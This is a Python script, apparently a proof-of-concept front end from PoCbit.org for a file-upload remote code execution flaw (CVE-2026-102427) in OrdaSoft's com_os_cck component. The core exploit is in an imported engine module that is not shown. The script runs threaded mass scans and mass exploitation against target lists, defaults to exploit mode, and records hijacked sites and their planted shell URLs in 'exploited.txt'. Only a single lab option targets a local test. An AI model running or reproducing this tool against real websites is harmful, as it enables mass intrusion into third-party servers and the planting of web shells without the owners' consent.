#!/usr/bin/env python3
# By: PoCbit.org — CVE-2026-102427 (OrdaSoft com_os_cck upload RCE)
from __future__ import annotations

import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional
from urllib.parse import urlparse

try:
    from colorama import Fore, Style, init as colorama_init

    colorama_init(autoreset=True)
except ImportError:
    Fore = Style = type("X", (), {"__getattr__": lambda *_: ""})()

import _engine as eng

RS = Style.RESET_ALL
FR = Style.BRIGHT + Fore.RED
FG = Style.BRIGHT + Fore.LIGHTGREEN_EX
FO = Style.BRIGHT + Fore.LIGHTYELLOW_EX
FW = Fore.WHITE
FD = Style.DIM

HITS_FILE = "hits.txt"
PWN_FILE = "exploited.txt"
_VERBOSE = False


def _hit(m: str) -> None:
    print(f"{FG}[+]{RS} {m}", flush=True)


def _info(m: str) -> None:
    print(f"{FO}[*]{RS} {m}", flush=True)


def _fail(m: str) -> None:
    print(f"{FR}[x]{RS} {m}", flush=True)


def _skip(host: str, why: str = "") -> None:
    tail = f" — {why}" if why else ""
    print(f"{FD}  ·  {host}{tail}{RS}", flush=True)


def _pwn(host: str, shell_url: str) -> None:
    print(
        f"\n  {FG}✔ RCE{RS}  {FO}{host}{RS}  {FW}shell{RS}  {shell_url}  "
        f"marker={eng.VERIFY_MARKER}\n",
        flush=True,
    )


def _dbg(host: str, m: str) -> None:
    if _VERBOSE:
        print(f"{FD}    {host} › {m}{RS}", flush=True)


def _store(path: str, line: str) -> None:
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
            f.flush()
    except OSError:
        pass


def _prompt(label: str, default: str = "") -> str:
    sfx = f" [{default}]" if default else ""
    v = input(f"  {FW}{label}{sfx}{RS}  {FO}›{RS} ").strip()
    return v if v else default


def _prompt_int(label: str, default: int) -> int:
    try:
        return int(_prompt(label, str(default)))
    except Exception:
        return default


def _banner() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    bar = f"  {FR}{'═' * 62}{RS}"
    print()
    print(bar)
    print(f"  {FO}CVE-2026-102427{RS}  {FW}OrdaSoft OS CCK · getContent upload RCE{RS}")
    print(f"  {FD}com_os_cck < 8.3.16  ·  CVSS 10.0 AT:N  ·  {eng.POCBIT_PAGE}{RS}")
    print(bar)
    print()


def _host(raw: str) -> str:
    base = eng.normalize_base(raw)
    return urlparse(base).netloc if base else ""


def _strike_check(base: str, timeout: int) -> None:
    host = _host(base)
    row = eng.check_target(base, timeout, None)
    if row.get("exploitable_candidate"):
        _hit(f"{host}  {row.get('status')}  ver={row.get('version') or '?'}")
        _store(HITS_FILE, "%s\t%s\t%s" % (base, row.get("status"), row.get("version") or ""))
    elif row.get("affected_version") is False and row.get("version"):
        _skip(host, row.get("status", "patched"))
    else:
        _skip(host, row.get("status", "no os_cck"))


def _strike_exploit(base: str, timeout: int) -> None:
    host = _host(base)
    row = eng.exploit_target(base, timeout, None, dry_run=False, force=False)
    if row.get("exploited"):
        h = row.get("hit") or {}
        shell = h.get("shell_url") or ""
        _store(PWN_FILE, "%s\t%s\t%s" % (base, shell, row.get("version") or ""))
        _pwn(host, shell)
        return
    _skip(host, row.get("status", "fail"))


def _worker(raw: str, mode: str, timeout: int) -> None:
    base = eng.normalize_base(raw)
    if not base:
        return
    try:
        if mode == "check":
            _strike_check(base, timeout)
        else:
            _strike_exploit(base, timeout)
    except Exception as e:
        _dbg(_host(base), str(e))
        _skip(_host(base), "error")


def _run_mass(mode: str, list_file: str, threads: int, timeout: int) -> None:
    if not os.path.exists(list_file):
        _fail("File not found: %s" % list_file)
        sys.exit(1)
    targets = eng.load_targets(list_file)
    if not targets:
        _fail("Empty target list.")
        sys.exit(1)
    out = HITS_FILE if mode == "check" else PWN_FILE
    _info("Mode     ->  %s" % mode)
    _info("Targets  ->  %d" % len(targets))
    _info("Threads  ->  %d  ·  Timeout ->  %ds" % (threads, timeout))
    _info("Output   ->  %s" % out)
    print(f"  {FD}{'─' * 58}{RS}\n")
    t0 = time.perf_counter()
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_worker, t, mode, timeout): t for t in targets}
        try:
            for _ in as_completed(futs):
                pass
        except KeyboardInterrupt:
            _fail("Stopped.")
            sys.exit(1)
    _hit("Done in %.1fs" % (time.perf_counter() - t0))


def _run_single(url: str, mode: str, timeout: int) -> None:
    base = eng.normalize_base(url)
    if not base:
        _fail("Invalid URL")
        sys.exit(1)
    if mode == "check":
        row = eng.check_target(base, timeout, None)
        print(eng.json.dumps(row, ensure_ascii=True, indent=2, default=str))
        sys.exit(0 if row.get("exploitable_candidate") else 1)
    row = eng.exploit_target(base, timeout, None, force=False)
    print(eng.json.dumps(row, ensure_ascii=True, indent=2, default=str))
    sys.exit(0 if row.get("exploited") else 1)


def _run_lab() -> None:
    row = eng.run_local_lab()
    print(eng.json.dumps(row, ensure_ascii=True, indent=2, default=str))
    sys.exit(0 if row.get("exploited") else 1)


def _interactive() -> None:
    global _VERBOSE
    _banner()
    mode = _prompt("Mode (check / exploit)", "exploit").lower()
    if mode not in ("check", "exploit"):
        mode = "exploit"
    list_file = _prompt("Targets list", "hits.txt")
    threads = _prompt_int("Threads", 12)
    timeout = _prompt_int("Timeout (sec)", 20)
    _VERBOSE = _prompt("Verbose (y/n)", "n").lower() in ("y", "yes")
    print()
    _run_mass(mode, list_file, threads, timeout)


def _parse_argv() -> None:
    global _VERBOSE
    args = sys.argv[1:]
    if not args:
        _interactive()
        return
    if args[0] in ("-h", "--help"):
        print(
            "Usage:\n"
            "  python poc.py                    interactive\n"
            "  python poc.py targets.txt        mass exploit\n"
            "  python poc.py --check list.txt   mass scan -> hits.txt\n"
            "  python poc.py -u https://site    single exploit\n"
            "  python poc.py -u URL --check     single scan\n"
            "  python poc.py --lab              local test\n"
            "  python _engine.py --help\n"
        )
        sys.exit(0)
    if args[0] == "--lab":
        _run_lab()
        return
    mode = "exploit"
    url: Optional[str] = None
    list_file: Optional[str] = None
    threads = 12
    timeout = 20
    i = 0
    while i < len(args):
        a = args[i]
        if a in ("--check", "-c"):
            mode = "check"
        elif a in ("-u", "--url"):
            i += 1
            url = args[i] if i < len(args) else ""
        elif a in ("-t", "--threads"):
            i += 1
            threads = int(args[i]) if i < len(args) else 12
        elif a in ("-T", "--timeout"):
            i += 1
            timeout = int(args[i]) if i < len(args) else 20
        elif a in ("-v", "--verbose"):
            _VERBOSE = True
        elif not a.startswith("-") and list_file is None and url is None:
            list_file = a
        i += 1
    if url:
        _run_single(url, mode, timeout)
        return
    if list_file:
        _run_mass(mode, list_file, threads, timeout)
        return
    _fail("Need targets.txt or -u URL. Try: python poc.py --help")
    sys.exit(1)


if __name__ == "__main__":
    _parse_argv()
